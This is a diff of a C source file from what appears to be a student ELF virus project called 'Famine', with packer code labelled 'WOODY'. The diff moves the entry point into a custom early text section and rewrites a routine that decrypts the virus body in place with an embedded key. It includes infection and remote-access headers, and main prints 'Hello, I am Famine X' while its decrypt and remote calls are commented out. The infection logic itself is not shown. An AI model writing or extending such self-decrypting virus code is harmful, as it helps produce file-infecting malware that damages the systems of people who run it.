@@ -1,20 +1,19 @@
-int main(int ac, char **av) asm ("entry");
-
 #include "lib/lib.h"
 #include "lib/remote.h"
 #include "lib/infect.h"
 #include "virus_pos.h"
 
-//extern size_t memaddr;
-extern void _infect();
-extern size_t size;
+int __attribute__((section (".textearly"))) main(int ac, char **av) asm ("entry");
+void __attribute__((section (".textearly"))) decrypt();
+
+
+extern size_t virus_addr;
+extern size_t virus_length;
 
 //======================= WOODY ==============================
 
-extern size_t text_start;
-extern size_t text_length;
-
-extern char test_area;
+extern size_t crypt_off;
+extern size_t crypt_length;
 
 extern char   key[16];
 
@@ -36,17 +35,23 @@ void decrypt_block(uint32_t* v, uint32_t *k) {
 
 extern void decrypt_block_asm(uint32_t *v, uint32_t *k);
 
-void __attribute__((section (".textearly")))decrypt(char *s, uint64_t n, uint32_t *k){
+void decrypt(){
+	char *s = ((char*)virus_addr) + crypt_off;
+	uint64_t n = crypt_length;
+
 	for (uint64_t i = 0; i < n; i += 8){
 		if (i + 7 <= n){
-			decrypt_block_asm((uint32_t*)(s+i), k);
+			decrypt_block_asm((uint32_t*)(s+i), (uint32_t*)key);
 		}
 	}
 }
 
 //=============================================================
 
-int __attribute__((section (".textearly")))main(int ac, char **av){
+int main(int ac, char **av){
+	//CALL ANY FUNCTIONS HERE IT WILL SEGV
+	//println("Hello, I am Famine");
+	//decrypt();
 	//remote();
-	println("Hello, I am Famine");
+	println("Hello, I am Famine X");
 }
